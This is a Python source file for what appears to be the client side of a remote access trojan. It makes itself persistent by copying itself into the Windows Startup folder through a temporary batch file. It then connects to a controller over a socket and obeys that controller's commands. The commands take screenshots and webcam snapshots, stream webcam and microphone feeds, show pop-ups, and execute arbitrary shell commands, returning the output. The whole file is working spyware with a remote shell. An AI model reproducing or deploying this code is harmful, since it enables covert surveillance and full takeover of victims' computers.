import socket 
import os 
import subprocess
import time
import cv2
import pickle
import struct
import threading
import pyautogui
import ctypes
import sys

# ensure project root is importable (so we can import config from parent folder)
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.realpath(__file__))))
from config import MagicString


PATH = os.path.dirname(os.path.realpath(__file__))
NAME = os.path.basename(__file__)
script = os.path.join(PATH, NAME)
base = "\\".join(PATH.split("\\")[0:3])
STARTUP_FOLDER = r"AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
user_startup = os.path.join(base, STARTUP_FOLDER)


if "Microsoft" not in PATH:
    with open("AutoSt.bat", "w") as file:
        file.write(f'@echo off\ncopy "{script}" "{user_startup}"')
    os.system("AutoSt.bat")
    os.remove("AutoSt.bat")


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
HOST = socket.gethostname()
PORT = 8080

s.connect((HOST,PORT))


def error_response():
    global s
    s.send(MagicString.ERROR_MSG.value.encode("utf-8"))

def send_image_data():
    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    time.sleep(2)
    s2.connect((HOST, 8081))
    print("CONNECTED TO 2nd socket ")

    while True: 
        cap = cv2.VideoCapture(0)
        ret, frame=cap.read()
        data = pickle.dumps(frame)
        message_size = struct.pack("L", len(data))
        s2.send(message_size + data)

def sending_images():
    
    os.system("python webcam-client.py")

def sending_audio_data():

    os.system("python microphone-client.py")


def show_popup(title, message):
    ctypes.windll.user32.MessageBoxW(0, title, message, 0)



while True:
    command = s.recv(52).decode("utf-8")

    if command == MagicString.TAKE_SCREENSHOT.value or command == MagicString.TSS.value:
        screen = pyautogui.screenshot()
        screen.save(f"{base}\\screenshot.png")
        s.send(MagicString.TAKEN_SCREENSHOT.value.encode("utf-8"))
        with open(f"{base}\\screenshot.png", "rb") as file:
            data = file.read(609600)
            s.send(data)
        os.remove(f"{base}\\screenshot.png")

    elif command == MagicString.START_WEBCAM.value or command == MagicString.START_WEBCAM_SHORT.value:
        s.send(MagicString.STARTING_LIVESTREAM.value.encode("utf-8"))
        p = threading.Thread(target=sending_images)
        p.start()

    elif command == MagicString.START_MICROPHONE.value or command == MagicString.START_MICROPHONE_SHORT.value:
        s.send(MagicString.STARTING_AUDIOSTREAM.value.encode(MagicString.ENCODING_CP1252.value))
        p = threading.Thread(target=sending_audio_data)
        p.start()

    elif command == MagicString.TAKE_SNAPSHOT.value or command == MagicString.TSS.value:
        camera = cv2.VideoCapture(0)
        for i in range(10):
            return_value, image = camera.read()
            cv2.imwrite('snapshot.png', image)
        del(camera)
        s.send(MagicString.TAKEN_SNAPSHOT.value.encode("utf-8"))
        with open("snapshot.png","rb") as file:
            data = file.read(609600)
            s.send(data)
        os.remove("snapshot.png")

    elif command.split(" ")[0] == MagicString.SHOW_POPUP.value and command[-1] == "'":
        title = command.split("'")[1]
        message = command.split("'")[3]
        threading.Thread(target=show_popup, args=(title, message)).start()


    elif command != "":
        proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output, error = proc.communicate()
        if error != b"":
            error_response()    
        elif "cd" in command:
            s.send(f"Changed directory to: {os.getcwd()}".encode("utf-8"))
        else:
            s.send(output)